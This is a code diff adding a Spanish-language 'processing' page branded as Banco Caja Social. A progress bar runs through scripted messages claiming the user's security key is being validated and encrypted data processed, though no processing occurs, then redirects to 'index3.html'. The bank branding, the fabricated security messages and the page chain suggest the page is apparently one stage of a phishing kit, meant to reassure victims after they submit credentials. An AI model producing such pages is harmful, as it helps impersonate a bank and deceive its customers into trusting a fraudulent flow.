@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Procesando Datos - Banco caja Social</title>
+    <style>
+        :root {
+            --primary-color: #F9D616; /* Amarillo */
+            --accent-color: #003366; /* Azul Oscuro */
+            --success-color: #00a854;
+            --main-blue: #0669d0; 
+        }
+        body {
+            margin: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: var(--main-blue); 
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            flex-direction: column;
+            text-align: center;
+            color: var(--accent-color);
+        }
+        .container {
+            /* ✅ CAMBIO: Opacidad ajustada a 0.95 (95% sólido) */
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(5px);
+            padding: 40px;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.15);
+            max-width: 400px;
+            width: 90%;
+            animation: fadeIn 0.5s ease-out;
+            color: var(--accent-color); 
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        h2 {
+            font-size: 24px;
+            font-weight: 700;
+            margin-bottom: 10px;
+            color: var(--accent-color);
+        }
+        p {
+            font-size: 16px;
+            color: #555;
+            margin-bottom: 30px;
+        }
+        .progress-bar-container {
+            width: 100%;
+            height: 15px;
+            /* Fondo de la barra (el carril vacío) en gris claro */
+            background-color: rgba(0, 0, 0, 0.1); 
+            border-radius: 10px;
+            margin-bottom: 15px;
+            overflow: hidden;
+        }
+        .progress-bar {
+            height: 100%;
+            width: 0%;
+            /* La barra de progreso es azul */
+            background-color: var(--main-blue); 
+            transition: width 0.1s linear; 
+            border-radius: 10px;
+        }
+        #status-message {
+            font-weight: 600;
+            color: var(--accent-color);
+            min-height: 20px;
+            transition: color 0.5s;
+        }
+        .success #status-message {
+            color: var(--success-color);
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h2>Procesando Solicitud</h2>
+        <p>Estamos verificando y validando sus datos. Esto puede tardar unos segundos.</p>
+        
+        <div class="progress-bar-container">
+            <div class="progress-bar" id="progressBar"></div>
+        </div>
+        
+        <div id="status-message">Conectando con el sistema...</div>
+    </div>
+
+    <script>
+        const progressBar = document.getElementById('progressBar');
+        const statusMessage = document.getElementById('status-message');
+        const container = document.querySelector('.container');
+        const FINAL_REDIRECT_URL = "index3.html"; 
+        const TOTAL_DURATION = 5000; 
+        
+        let startTime = Date.now();
+        
+        const messages = [
+            { time: 500, message: "Validando la clave de seguridad..." },
+            { time: 1800, message: "Estableciendo conexión segura..." },
+            { time: 3500, message: "Procesando datos encriptados..." },
+            { time: 4500, message: "Confirmación de datos recibida." }
+        ];
+
+        function updateProgress() {
+            const elapsedTime = Date.now() - startTime;
+            let progress = Math.min(100, (elapsedTime / TOTAL_DURATION) * 100);
+
+            progressBar.style.width = progress + '%';
+
+            messages.forEach(item => {
+                if (elapsedTime >= item.time && statusMessage.textContent !== item.message) {
+                    statusMessage.textContent = item.message;
+                }
+            });
+
+            if (progress < 100) {
+                requestAnimationFrame(updateProgress);
+            } else {
+                container.classList.add('success'); 
+                
+                setTimeout(() => {
+                    window.location.href = FINAL_REDIRECT_URL;
+                }, 500);
+            }
+        }
+
+        window.onload = updateProgress;
+    </script>
+
+</body>
+</html>
